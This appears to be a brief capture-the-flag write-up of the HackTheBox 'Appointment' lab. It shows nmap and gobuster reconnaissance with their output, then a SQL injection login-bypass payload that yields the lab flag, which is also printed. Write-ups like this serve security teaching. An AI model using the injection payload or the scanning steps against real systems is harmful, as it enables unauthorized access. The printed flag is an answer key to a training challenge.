---
title: "HTB: appointment"
date: 2022-04-29T21:54:03-07:00
draft: false
tags: ["web"]
categories: ["htb"]
# description: "This is a description"
---

A simple writeup for the `appointment` box from HTB

<!--more-->

### nmap
Strating with an nmap.

```
# Nmap 7.92 scan initiated Fri Apr 29 16:22:44 2022 as: nmap -sV -sC -oA nmap/appointment 10.129.22.167
Nmap scan report for 10.129.22.167
Host is up (0.12s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 29 16:22:56 2022 -- 1 IP address (1 host up) scanned in 12.20 seconds
```

Nothing too interesting here.

### gobuster
Pivoted to gobuster to see subdirectories:\
`gobuster dir -u http://10.129.22.167 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

```
/images               (Status: 301) [Size: 315] [--> http://10.129.22.167/images/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.22.167/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.22.167/js/]
/vendor               (Status: 301) [Size: 315] [--> http://10.129.22.167/vendor/]
```

### sqlinjection

After looking at the webage, the input forms seemed potentially vulnerable to sqlinjection.

`uname=admin'#` payload granted the flag.

---
**flag:**
`e3d0796d002a446c0e622226f42e9672`